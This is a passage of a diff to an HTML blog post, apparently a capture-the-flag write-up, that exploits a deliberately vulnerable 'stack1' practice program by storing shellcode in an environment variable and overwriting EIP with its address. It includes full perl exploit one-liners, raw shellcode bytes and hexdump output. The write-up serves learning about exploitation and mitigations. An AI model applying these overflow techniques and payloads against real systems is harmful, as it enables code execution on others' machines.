 <p class="nested">It did work! Although a junk byte was appended to the winning message, it really does not matter for this example. We are clear (hopefully :) with the exploitation technique and it is all that matters. Notice however that we used the address of <code>buf</code> to jump back to our shellcode and it is one thing which makes our exploit highly unreliable. There are certain techniques through which you can reliably jump to your shellcode without using memory addresses that could possibly differ between multiple systems. Please refer the <a href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/">Exploit writing tutorial part 2 : Stack Based Overflows - jumping to shellcode</a> post from <a href="https://twitter.com/corelanc0d3r">corelanc0d3r</a> for more details.</p>
 <p class="nested">For this solution, we turned off another mitigation feature (<code>ASLR</code>). Even in its presence we were able to gain successful exploitation (using solutions #1 and #2) but that was because we had alternate tricks. However, those were very specific to the vulnerable <code>stack1</code> program. They won't always work, but you now understand that an insight about how things really work, could help with designing custom solutions and hacking around any limitations that stop you from gaining successful exploitation. This solution helped us to get an insight into how useful addressing information could be for an exploit writer and how the <code>ASLR</code> technique helps to mitigate exploit attempts that use such information.</p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Solution #4: Inject and execute a shellcode, that simulates the second printf statement, through an environment variable and overwrite EIP with its address</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Solution #4: Inject and execute a shellcode, that simulates the second <code>printf</code> statement, through an environment variable and overwrite EIP with its address</h2>
 <p class="nested">Let's now move to the final solution for the <code>stack1</code> program. First, let's have a quick review of solution #3. We injected a shellcode that simulated the behavior of <code>printf</code> statement. We redirected control to our shellcode and achieved exploitation. However, a minor modification was required to our exploit command-line that changed the look and feel of our winning message. The newline character caused the <code>gets</code> copy loop to stop overwriting memory addresses past the terminating character and as such we had to remove it from our exploit shellcode. Although this issue was easily resolved though a quick and dirty hack, it might pose significant issues in real world exploit attempts. Could there be a better/elegant solution to this problem?</p>
 <p class="nested">Okay, no guess work required here. There indeed is one such trick that could help us overcome the newline character issue. The shellcode we injected through the <code>buf</code> array could be stored within an environment variable and then the EIP could be overwritten with the address of this variable to get successful execution. But wait! Where did the idea of environment variable come from? Why are we using it anyways? How exactly does it help to bypass the newline filter? Let's understand these first.</p>
 <p class="nested">There are a few scenarios in which injecting shellcode through an environment variable is the only viable option. One such scenario is when you encounter a buffer that is too small to fit in your desired shellcode. Since an environment variable could be of arbitrary size, we could inject a huge shellcode like the one simulating the <a href="http://en.wikibooks.org/wiki/Metasploit/MeterpreterClient">Meterpreter</a> payload in <a href="http://en.wikibooks.org/wiki/Metasploit">Metasploit Framework</a> and get it executed on the target system. In our case, we were lucky enough to have a large <code>buf</code> that could completely hold our <code>printf</code> shellcode. Another scenario could be when string termination filters, like newline above, are encountered. For solution #3, we hacked around and got the message printed, but it obviously won't work in all cases. In such a scenario, we could inject our shellcode into an environment variable. Since the shellcode is injected independent of the vulnerable program, it helps to bypass its inherent filters. The only challenging part that remains is redirecting control to the location where this shellcode in the environment variable is placed.</p>
-<p class="nested">One of the most important reason to use an environment variable to hold exploit shellcode is its memory placement. These variables are copied into the stack segment of all processes and as such they provide a means for code execution for stack-based exploits. Let's inject the shellcode we prepared earlier into an environment variable, called <code>WINCODE</code> and use its address to overwrite EIP and get code execution. There are a few techniques using which the address of an environment variable can be accurately calculated and we won't need a NOP sled in front of our shellcode. If you have any queries regarding environment variable based exploitation, please refer <strong>section 0x331 Using the Environment</strong> from <a href="https://www.nostarch.com/hacking2.htm">Hacking - The Art of Exploitation</a> book:</p>
-<p class="nested"re><code># export WINCODE=$(cat shellcode.bin)
+<p class="nested">One of the most important reason to use an environment variable to hold exploit shellcode is its memory placement. These variables are copied into the stack segment of all processes and as such they provide a means for code execution for stack-based exploits. Let's inject the shellcode we prepared earlier into an environment variable, called <code>WINCODE</code> and use its address to overwrite EIP and get code execution. There are a few techniques using which the address of an environment variable can be accurately calculated and we won't need a NOP sled in front of our shellcode. If you have any queries regarding environment variable based exploitation, please refer <code>section 0x331 Using the Environment</code> from <a href="https://www.nostarch.com/hacking2.htm">Hacking - The Art of Exploitation</a> book:</p>
+<pre class="nested"><code># export WINCODE=$(cat shellcode.bin)
 #
 # echo $WINCODE | hexdump -C
 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
@@ -580,13 +550,13 @@ you win!#
 </code></pre>
 
 <p class="nested">We successfully redirected EIP to a NOP-less shellcode present within an environment variable. And it did work! However the output is not exactly what we had expected. There's no newline at the end. Here is what hexdump has to say about our exploit:</p>
-<p class="nested"re><code># perl -e 'printf &quot;A&quot;x88 . &quot;\x18\xf7\xff\xbf&quot;' | ./stack1 | hexdump -C
+<pre class="nested"><code># perl -e 'printf &quot;A&quot;x88 . &quot;\x18\xf7\xff\xbf&quot;' | ./stack1 | hexdump -C
 00000000  79 6f 75 20 77 69 6e 21  00                       |you win!.|
 00000009
 </code></pre>
 
 <p class="nested">Although the environment variable has a newline at the end, it is not echoed back when the shellcode executes. I made a small change to the original shellcode to include <code>0x0a</code> and <code>0x0d</code> characters and used it for testing:</p>
-<p class="nested"re><code># perl -e 'print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a\x0d&quot;' &gt;shellcode.bin
+<pre class="nested"><code># perl -e 'print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a\x0d&quot;' &gt;shellcode.bin
 #
 # export WINCODE=$(cat shellcode.bin)# echo $WINCODE | hexdump -C 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
 00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
@@ -601,20 +571,19 @@ you win!
 </code></pre>
 
 <p class="nested">This time just the <code>0x0a</code> was echoed back and it, as expected, corrects the exploit output. However, I could not understand this strange behavior. If you have any ideas please get back. So, we have now successfully exploited the <code>stack1</code> program through a shellcode injected into an environment variable. Please note that the use of environment variables is only possible for local exploits and as such it is not much used in common exploits that you see in the wild. However, as you have already seen, it is one of the most reliable methods of exploitation.</p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Conclusion</h2>
 <p class="nested">All these solutions are however not practical since they require disabling of recent mitigation features. They serve the purpose of understanding how exploits worked before mitigation features were introduced.</p>
-        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#ctf>ctf</a> and <a href=/tags.html#exploit>exploit</a>)</p>
-                  <p class="nested" style="text-align:center;">« <a href="/posts/20120710_exploit-mitigation-techniques-on-linux.html">Exploit Mitigation Techniques ...</a> « | » <a href="/posts/20120902_soritong-m3u-seh-overflow.html">SoriTong MP3 Player .m3u File ...</a> »</p>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#ctf>ctf</a> and <a href=/tags.html#exploit>exploit</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20120710_exploit-mitigation-techniques-on-linux.html">Exploit Mitigation Techniques ...</a> « | » <a href="/posts/20120902_soritong-m3u-seh-overflow.html">SoriTong MP3 Player .m3u File ...</a> »</p>
             </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
     <script>
       function toggle(elem) {
         elem.classList.toggle("expanded");
-
-        var ish2 = false; var ish3 = false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
-        console.log(elem); console.log(ish2); console.log(ish3);
-
+        var ish2=false; var ish3=false; var ish4=false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
+        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
         var sibling = elem.nextElementSibling;
         while (sibling) {
           if (ish2 && sibling.classList.contains("h2")) {
@@ -622,6 +591,10 @@ you win!
             break;
           }
           if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
             sibling.classList.toggle("active");
             break;
           }
